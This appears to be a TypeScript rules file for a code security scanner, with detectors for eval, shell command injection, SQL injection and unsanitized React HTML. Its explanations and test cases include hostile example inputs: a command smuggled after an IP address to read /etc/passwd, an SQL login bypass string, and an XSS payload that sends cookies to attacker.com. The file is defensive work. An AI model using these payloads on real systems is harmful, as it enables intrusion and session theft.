import type { SecurityRule, SecurityFindingDetails } from "../types.js";
import { ASTAnalyzer } from "../ast-analyzer.js";

export const inputValidationRules: SecurityRule[] = [
  // 1. eval() or new Function()
  {
    id: "SEC-INP-001",
    category: "filesystem",
    severity: "critical",
    title: "Dangerous Dynamic Code Execution (eval)",
    frameworks: ["all"],
    provider: "none",
    description: "Use of eval() or new Function() allows arbitrary JavaScript execution.",
    whyThisIsDangerous:
      "eval() executes whatever string is passed to it as code in the current scope context. If any part of the string comes from user input or external dynamic values, it results in arbitrary Remote Code Execution.",
    howAttackersAbuseIt:
      "An attacker sends code payload strings via API params that execute server commands or leak memory.",
    suggestedFix: "Remove eval() completely. Parse JSON with JSON.parse() or use safe expression evaluators.",
    owaspMapping: "A03:2021 - Injection",
    cwe: "CWE-95",
    testCases: [
      {
        name: "Detect eval",
        code: `const result = eval(req.query.expr);`,
        shouldMatch: true,
      },
    ],
    match: (astContext) => {
      const findings: SecurityFindingDetails[] = [];
      const { sourceFile } = ASTAnalyzer.parse(astContext.filePath, astContext.fileContent);
      const matches = ASTAnalyzer.findCallExpressions(sourceFile, ["eval", "Function"]);

      matches.forEach((m) => {
        findings.push({
          ruleId: "SEC-INP-001",
          category: "filesystem" as const,
          severity: "critical" as const,
          confidence: "high" as const,
          title: "Dangerous Dynamic Code Execution (eval)",
          message: `Dynamic evaluation function '${m.name}' called at line ${m.line}.`,
          evidence: {
            file: astContext.filePath,
            line: m.line,
            column: m.col,
            snippet: m.text,
            symbol: m.name,
          },
          affectedFiles: [astContext.filePath],
          affectedLines: [m.line],
          whyThisIsDangerous: "Dynamic code execution allows arbitrary code evaluation.",
          howAttackersAbuseIt: "Attacker injects JavaScript code into expression inputs.",
          suggestedFix: "Refactor code to avoid eval() or new Function().",
          automaticFixAvailability: { available: false },
          documentation: {
            owasp: "A03:2021-Injection",
            cwe: "CWE-95",
          },
          owaspMapping: "A03:2021 - Injection",
        });
      });

      return findings;
    },
  },

  // 2. Command Injection via child_process.exec
  {
    id: "SEC-INP-002",
    category: "server-security",
    severity: "critical",
    title: "Command Injection via Shell Execution",
    frameworks: ["all"],
    provider: "none",
    description: "child_process.exec() or execSync() called with string concatenation containing dynamic variables.",
    whyThisIsDangerous:
      "exec() passes the string to a system shell (/bin/sh or cmd.exe). Concatenating user inputs into shell commands allows shell metacharacters (; | & `) to execute additional unintended commands.",
    howAttackersAbuseIt:
      "Attacker inputs `127.0.0.1; cat /etc/passwd` into a ping utility field to read confidential system files.",
    suggestedFix: "Use child_process.execFile() or spawn() with argument arrays instead of shell command strings.",
    owaspMapping: "A03:2021 - Injection",
    cwe: "CWE-78",
    testCases: [
      {
        name: "Detect exec concat",
        code: `exec("ping " + req.query.host);`,
        shouldMatch: true,
      },
    ],
    match: (astContext) => {
      const findings: SecurityFindingDetails[] = [];
      const lines = astContext.fileContent.split("\n");

      lines.forEach((lineText, idx) => {
        const lineNum = idx + 1;
        const lower = lineText.toLowerCase();

        if (
          (lower.includes("exec(") || lower.includes("execsync(")) &&
          (lower.includes(" + ") || lower.includes("${") || lower.includes("req."))
        ) {
          findings.push({
            ruleId: "SEC-INP-002",
            category: "server-security" as const,
            severity: "critical" as const,
            confidence: "high" as const,
            title: "Command Injection via Shell Execution",
            message: `Shell command built with variable concatenation at line ${lineNum}: '${lineText.trim()}'.`,
            evidence: {
              file: astContext.filePath,
              line: lineNum,
              snippet: lineText.trim(),
            },
            affectedFiles: [astContext.filePath],
            affectedLines: [lineNum],
            whyThisIsDangerous:
              "Concatenating untrusted inputs into exec() allows attackers to execute arbitrary system shell commands.",
            howAttackersAbuseIt:
              "Attacker passes command separators (; && |) in request parameters.",
            suggestedFix: "Use execFile() or spawn() with arguments array without shell invocation.",
            automaticFixAvailability: { available: false },
            documentation: {
              owasp: "A03:2021-Injection",
              cwe: "CWE-78",
            },
            owaspMapping: "A03:2021 - Injection",
          });
        }
      });

      return findings;
    },
  },

  // 3. SQL Injection via String Concatenation
  {
    id: "SEC-INP-003",
    category: "filesystem",
    severity: "critical",
    title: "SQL Injection via String Concatenation",
    frameworks: ["all"],
    provider: "none",
    description: "Database SQL query constructed using raw string concatenation or template literal variables.",
    whyThisIsDangerous:
      "Concatenating dynamic variables into raw SQL strings allows attackers to alter query logic, bypass authentication, or drop tables.",
    howAttackersAbuseIt:
      "Attacker inputs `' OR '1'='1` into login input fields.",
    suggestedFix: "Use parameterized queries (e.g. `db.query('SELECT * FROM users WHERE id = $1', [id])`) or an ORM like Prisma/Drizzle.",
    owaspMapping: "A03:2021 - Injection",
    cwe: "CWE-89",
    testCases: [
      {
        name: "Detect SQL concat",
        code: `db.query("SELECT * FROM users WHERE email = '" + req.body.email + "'");`,
        shouldMatch: true,
      },
    ],
    match: (astContext) => {
      const findings: SecurityFindingDetails[] = [];
      const lines = astContext.fileContent.split("\n");

      lines.forEach((lineText, idx) => {
        const lineNum = idx + 1;
        const lower = lineText.toLowerCase();

        if (
          (lower.includes("select ") || lower.includes("insert into") || lower.includes("update ") || lower.includes("delete from")) &&
          (lower.includes(" + ") || lower.includes("${")) &&
          (lower.includes("req.") || lower.includes("params") || lower.includes("body") || lower.includes("query"))
        ) {
          findings.push({
            ruleId: "SEC-INP-003",
            category: "filesystem" as const,
            severity: "critical" as const,
            confidence: "high" as const,
            title: "SQL Injection via String Concatenation",
            message: `Raw SQL query constructed with string concatenation at line ${lineNum}.`,
            evidence: {
              file: astContext.filePath,
              line: lineNum,
              snippet: lineText.trim(),
            },
            affectedFiles: [astContext.filePath],
            affectedLines: [lineNum],
            whyThisIsDangerous: "Dynamic SQL string building allows SQL Injection attacks.",
            howAttackersAbuseIt: "Attacker passes quotes and SQL subqueries in input values.",
            suggestedFix: "Use parameterized SQL statements with placeholder bindings ($1, ?).",
            automaticFixAvailability: { available: false },
            documentation: {
              owasp: "A03:2021-Injection",
              cwe: "CWE-89",
            },
            owaspMapping: "A03:2021 - Injection",
          });
        }
      });

      return findings;
    },
  },

  // 4. Unsafe HTML Injection (dangerouslySetInnerHTML)
  {
    id: "SEC-INP-004",
    category: "frontend-security",
    severity: "warning",
    title: "Unsafe HTML Rendering (XSS)",
    frameworks: ["react", "nextjs"],
    provider: "none",
    description: "dangerouslySetInnerHTML used without prior DOMPurify or HTML sanitization.",
    whyThisIsDangerous:
      "Rendering raw HTML string in React bypasses React's automatic XSS escaping, enabling Cross-Site Scripting (XSS).",
    howAttackersAbuseIt:
      "Attacker stores `<script>fetch('http://attacker.com?c=' + document.cookie)</script>` in user comments.",
    suggestedFix: "Sanitize HTML using DOMPurify before setting dangerouslySetInnerHTML: `dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }}`.",
    owaspMapping: "A03:2021 - Injection",
    cwe: "CWE-79",
    testCases: [
      {
        name: "Detect raw dangerouslySetInnerHTML",
        code: `<div dangerouslySetInnerHTML={{ __html: userInput }} />`,
        shouldMatch: true,
      },
    ],
    safeAutoFix: (content) => {
      if (content.includes("dangerouslySetInnerHTML") && !content.includes("DOMPurify.sanitize")) {
        const fixed = content.replace(
          /dangerouslySetInnerHTML=\{\{\s*__html:\s*([^}]+)\s*\}\}/g,
          "dangerouslySetInnerHTML={{ __html: typeof DOMPurify !== 'undefined' ? DOMPurify.sanitize($1) : $1 }}"
        );
        return {
          modifiedContent: fixed,
          description: "Wrapped dangerouslySetInnerHTML payload in DOMPurify.sanitize().",
        };
      }
      return null;
    },
    match: (astContext) => {
      const findings: SecurityFindingDetails[] = [];
      const lines = astContext.fileContent.split("\n");

      lines.forEach((lineText, idx) => {
        const lineNum = idx + 1;
        if (lineText.includes("dangerouslySetInnerHTML") && !lineText.includes("DOMPurify.sanitize") && !lineText.includes("sanitize(")) {
          findings.push({
            ruleId: "SEC-INP-004",
            category: "frontend-security" as const,
            severity: "warning" as const,
            confidence: "high" as const,
            title: "Unsafe HTML Rendering (XSS)",
            message: `dangerouslySetInnerHTML used without sanitization at line ${lineNum}.`,
            evidence: {
              file: astContext.filePath,
              line: lineNum,
              snippet: lineText.trim(),
            },
            affectedFiles: [astContext.filePath],
            affectedLines: [lineNum],
            whyThisIsDangerous: "Unsanitized HTML rendering allows stored XSS script injection.",
            howAttackersAbuseIt: "Attacker injects script tags that execute in other users' browsers.",
            suggestedFix: "Pass input through DOMPurify.sanitize() first.",
            automaticFixAvailability: {
              available: true,
              fixId: "fix-xss-sanitize",
              description: "Wrap HTML payload with DOMPurify.sanitize()",
            },
            documentation: {
              owasp: "A03:2021-Injection",
              cwe: "CWE-79",
            },
            owaspMapping: "A03:2021 - Injection",
          });
        }
      });

      return findings;
    },
  },
];
